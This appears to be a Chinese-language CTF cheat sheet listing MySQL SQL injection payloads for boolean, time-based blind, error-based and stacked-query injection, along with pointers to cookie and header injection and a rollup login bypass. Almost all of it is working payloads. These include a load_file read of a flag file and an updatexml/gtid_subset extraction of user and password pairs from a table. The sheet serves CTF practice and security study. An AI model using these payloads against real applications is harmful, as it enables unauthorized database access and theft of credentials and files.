# 布尔回显注入
	- https://www.anquanke.com/post/id/170626
	- `where id=1 and 1=1`
	- `where id=1!=2!=(database()regexp('.'))!=0`
	- `1&&((select 1,'z')>(select * from f1ag_1s_h3r3_hhhhh))`
	- `if(length(database())<0, '1', ST_X('willerror'))`
	- `exp(710-（1>1))`
- # 布尔无回显注入
	- `where id=1 and if(length(database())>5, sleep(2), 1)`
- # 报错注入
	- [大佬的文章](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/1-7-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.md)
	- `where id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,30)),0x7e),1)#`
	- `where id=updatexml(1,concat(0x7e,database(),0x7e),1)#`
	- `where id=updatexml(1,concat(0x7e,0x61,0x7e),1)#`
	- `') or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+`
	- `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`
	- `exp(710)`
	- `exp(~1)`
- # 堆叠注入
	- `where id=1; show tables;`
- # 注入方向
	- 向 cookie 注入
	- 向 x-forward-for 注入
- # with rollup万能密码
	- [[CTFWEB/WP/SWPU2019 Web6]]
- 二次注入
- 宽字节
- 脚本批量注入